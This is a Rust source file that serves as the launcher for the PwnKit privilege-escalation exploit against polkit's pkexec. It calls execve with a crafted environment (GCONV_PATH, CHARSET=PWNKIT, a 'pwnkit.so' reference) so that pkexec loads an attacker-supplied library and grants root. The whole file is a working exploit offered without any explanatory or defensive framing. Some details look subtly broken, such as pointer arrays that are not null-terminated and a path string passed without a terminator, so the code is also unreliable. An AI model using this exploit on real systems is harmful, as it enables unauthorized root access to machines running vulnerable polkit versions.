use std::ffi::CString;
use std::os::raw::c_char;

fn main() {
    unsafe {
        let args: Vec<*mut c_char> = vec![CString::from_vec_unchecked([0].to_vec()).into_raw()];
        let args: &[*mut c_char] = args.as_ref();

        let mut env_last: Vec<*mut c_char> = vec![CString::from_vec_unchecked([0].to_vec()).into_raw()];
        let env = ["pwnkit.so:.", "PATH=GCONV_PATH=.", "SHELL=/lol/i/do/not/exists",
		"CHARSET=PWNKIT", "GIO_USE_VFS="];
        let mut env: Vec<*mut c_char> = env.iter()
    .map(|e| CString::new(*e).expect("[ERR] buildng CString").into_raw()).collect();
        env.append(&mut env_last);
        let env: &[*mut c_char] = env.as_ref();

        libc::execve("/usr/bin/pkexec".as_ptr() as *const i8, 
            args.as_ptr() as *const *const i8, env.as_ptr() as *const *const i8);
    }
}
